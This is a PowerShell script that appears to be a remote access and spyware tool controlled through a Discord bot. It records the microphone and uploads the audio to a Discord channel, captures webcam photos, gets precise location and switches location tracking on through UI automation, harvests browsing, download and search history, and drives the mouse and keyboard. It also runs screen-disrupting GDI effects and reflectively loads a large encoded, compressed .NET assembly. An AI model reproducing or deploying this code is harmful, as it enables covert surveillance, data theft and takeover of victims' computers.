<#
Info Collection

spy-mic -t (duration in seconds)

allows you to record using the microphone

spy-cam -num (device number)

this can snap a photo when provided a device number (this info can be retrieved via spy-getcam)

spy-getcam (no args)

retrieves basic info about the camera available on the device

location-get -address (+/-)

will get precise coordinates of the device if location tracking is enabled, or a home address if using the -address switch

location-enable (no args)

uses .net ui automation to quickly enable location tracking

spy-browsinghistory (no args)

gets browsing history

spy-downloadhistory (no args)

gets download history 

spy-searchhistory (no args)

gets search history
#>

<#
Automation

auto-movcur -x (x coordinate) -y (y coordinate)

moves the mouse to a certain position

auto-getcur (no args)

gets the cursor position

auto-click (no args)

performs a left click

auto-rclick (no args)

performs a right click

auto-keybd -keys (keys to be typed)

sends keyboard input

auto-msg -m (message to be displayed) -t (title of the message box) -b(= 0) (button layout) -i(= 0) (icon)

displays a message box with a certain message
#>

<#
GDI

gdi-melt -s (duration in seconds)

gdi-flash -s (duration in seconds)

gdi-tunnel -s (duration in seconds)

gdi-stretch -s (duration in seconds)

gdi-blackout -s (duration in seconds)
#>

$token = "REPLACE_THIS"
$svrid = "REPLACE_THIS"
$mguid = gpv "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID"
$wc = [Net.WebClient]::new()
$wc.Headers.Add("Authorization", "Bot $token")
$cid = ($wc.DownloadString("https://discord.com/api/v10/guilds/$svrid/channels") | ConvertFrom-Json | ? {$_.name -eq ($mguid + "_cl")}).id

Add-Type -A System.Net.Http, System.Windows.Forms, System.Drawing, System.Device, UIAutomationClient, UIAutomationTypes
Add-Type 'using System;using System.Runtime.InteropServices;public class win {[DllImport("user32.dll")]public static extern void mouse_event(uint dwFlags,uint dx,uint dy,uint dwData,UIntPtr dwExtraInfo);[DllImport("winmm.dll")]public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, IntPtr hwndCallback);}'

function upload {
	param($file)
	$client = [Net.Http.HttpClient]::new()
	$client.DefaultRequestHeaders.Authorization = [Net.Http.Headers.AuthenticationHeaderValue]::new("Bot", "$token");
	$content = [Net.Http.MultipartFormDataContent]::new()
	$fileContent = [Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes("$pwd\$file"))
	$content.Add($fileContent, "files[0]", $file)
	$client.PostAsync("https://discord.com/api/v10/channels/$cid/messages", $content)
}
function spy-mic {
	param([int]$t)
	$g=new-guid
	[win]::mciSendString("open new Type waveaudio Alias recsound", $null, 120, [IntPtr]::Zero)
	$r=[win]::mciSendString("record recsound", $null, 0, [IntPtr]::Zero)
	if ($r-ne0){
		return "mic access disabled"
	}
	sleep $t
	[win]::mciSendString("save recsound mic.wav", $null, 0, [IntPtr]::Zero)
	[win]::mciSendString("close recsound", $null, 0, [IntPtr]::Zero)
	upload "mic.wav"
	ri "mic.wav"
}

$global:screen = [Windows.Automation.AutomationElement]::RootElement.Current.BoundingRectangle
function auto-movecur {
	param([int]$x = (Get-Random -Max $screen.Width),[int]$y = (Get-Random -Max $screen.Height))
	[Windows.Forms.Cursor]::Position = [Drawing.Point]::new($x,$y)
}
function auto-getcur {
	return [Windows.Forms.Cursor]::Position | select X,Y
}
function auto-click {
	[win]::mouse_event(2, 0, 0, 0, [UIntPtr]::Zero)
	[win]::mouse_event(4, 0, 0, 0, [UIntPtr]::Zero)
}
function auto-rclick {
	[win]::mouse_event(8, 0, 0, 0, [UIntPtr]::Zero)
	[win]::mouse_event(16, 0, 0, 0, [UIntPtr]::Zero)
}
function auto-keybd {
	param($keys)
	[Windows.Forms.SendKeys]::SendWait($keys)
}
function auto-msg {
	param($m,$t,[int]$b=0,$i=0)
	[Windows.Forms.MessageBox]::Show($m,$t,$b,$i)
}


Add-Type 'using System;using System.Runtime.InteropServices;public class GDI {[DllImport("user32.dll")]public static extern IntPtr GetDC(IntPtr hWnd);[DllImport("user32.dll")]public static extern void ReleaseDC(IntPtr hWnd, IntPtr hDC);[DllImport("gdi32.dll")]public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);[DllImport("gdi32.dll")]public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);}'
$SRCCOPY = 0x00CC0020;
$NOTSRCCOPY = 0x00330008;
$SRCAND = 0x00880006;
function gdi-melt {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$x = Get-Random -Max ($w + 1)
			$null = [GDI]::BitBlt($hdc, $x, 1, 25, $h, $hdc, $x, 0, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-flash {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::BitBlt($hdc, 0, 0, $w, $h, $hdc, 0, 0, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($NOTSRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-tunnel {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$size = 100
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::StretchBlt($hdc, $size / 2, $size / 2, $w - $size, $h - $size, $hdc, 0, 0, $w, $h, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-stretch {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::StretchBlt($hdc, -20, 0, $w + 40, $h, $hdc, 0, 0, $w, $h, $c);
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCCOPY)
	$null = $ps.BeginInvoke()
}
function gdi-blackout {
	param($s)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($s, $screen, $c)
		$t = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
		$hdc = [GDI]::GetDC([IntPtr]::Zero)
		while ((([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) - $t) -lt $s) {
			$w = $screen.Width
			$h = $screen.Height
			$null = [GDI]::BitBlt($hdc, (Get-Random (1..10)) % 2, (Get-Random (1..10)) % 2, $w, $h, $hdc, (Get-Random (1..1000)) % 2, (Get-Random (1..1000)) % 2, $c)
		}
		[GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
	}).AddArgument($s).AddArgument($screen).AddArgument($SRCAND)
	$null = $ps.BeginInvoke()
}
function getelementbyid {
	param($a)
	$condition = [Windows.Automation.PropertyCondition]::new([Windows.Automation.AutomationElement]::AutomationIdProperty,$a)
	$global:element = $settings.FindFirst("Descendants",$condition)
}
function getelementbyname {
	param($a)
	$condition = [Windows.Automation.PropertyCondition]::new([Windows.Automation.AutomationElement]::NameProperty,$a)
	$global:element = $settings.FindFirst("Descendants",$condition)
}
function location-enable {
	saps "ms-settings:privacy-location"
	sleep -m 500
	$root = [Windows.Automation.AutomationElement]::RootElement
	$windows = $root.FindAll("Children",[Windows.Automation.Condition]::TrueCondition)
	$settings = $windows | ? {$_.Current.Name -eq "Settings"}
	$disabled_all = (gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location").value -eq 'Deny'
	$disabled_app = (gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location").value -eq 'Deny'
	$disabled_dsk = (gp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location\NonPackaged").value -eq 'Deny'

	if ([environment]::osversion.version.build -ge 22000){
		if ($disabled_all) {
			getelementbyid "SystemSettings_CapabilityAccess_Location_SystemGlobal_ToggleSwitch"
			$r = $element.current.boundingrectangle
			movecur ([int]($r.x+$r.width/2)) ([int]($r.y+$r.height/2))
			click
			movecur $r.x $r.y
		}
	}
	else {
		if ($disabled_all) {
			getelementbyid "SystemSettings_CapabilityAccess_Location_SystemGlobal_Button"
			$toggle = $element.GetCurrentPattern([Windows.Automation.InvokePattern]::Pattern)
			$toggle.invoke()
			sleep -m 500
			$panel = $settings.FindAll("Descendants",[Windows.Automation.Condition]::TrueCondition) | ? {$_.current.name -match "Location access for this device"}
			$x = $panel.FindAll("Descendants",[Windows.Automation.Condition]::TrueCondition)
			$r = $d.current.boundingrectangle
			movecur ([int]($r.x+$r.width/2)+20) ([int]($r.y+$r.height/2))
			click
		}
	}
	if ($disabled_app) {
		getelementbyid "SystemSettings_CapabilityAccess_Location_UserGlobal_ToggleSwitch"
		$toggle = $element.GetCurrentPattern([Windows.Automation.TogglePattern]::Pattern)
		$toggle.toggle()
	}
	if ($disabled_dsk) {
		getelementbyid "SystemSettings_CapabilityAccess_Location_ClassicGlobal_ToggleSwitch"
		$toggle = $element.GetCurrentPattern([Windows.Automation.TogglePattern]::Pattern)
		$toggle.toggle()
	}
	keybd "%{F4}"
}
function location-get {
	param([switch]$address)
	$watcher = [Device.Location.GeoCoordinateWatcher]::new()
	$watcher.start()
	$loc=$watcher.position.location
	while ($loc.isunknown) {$loc=$watcher.position.location}
	$global:lat,$global:lon=$loc.latitude,$loc.longitude
	if ($address) {
		$global:addr=irm "https://nominatim.openstreetmap.org/reverse?lat=$lat&lon=$lon&format=json"
		return $addr
	}
	else {
		return $lat, $lon
	}
}

function load {
	param($asm)
	$ms = [IO.MemoryStream]::new()
	([IO.Compression.DeflateStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($asm)),[IO.Compression.CompressionMode]::Decompress)).CopyTo($ms)
	[Reflection.Assembly]::Load($ms.toarray())
}
load "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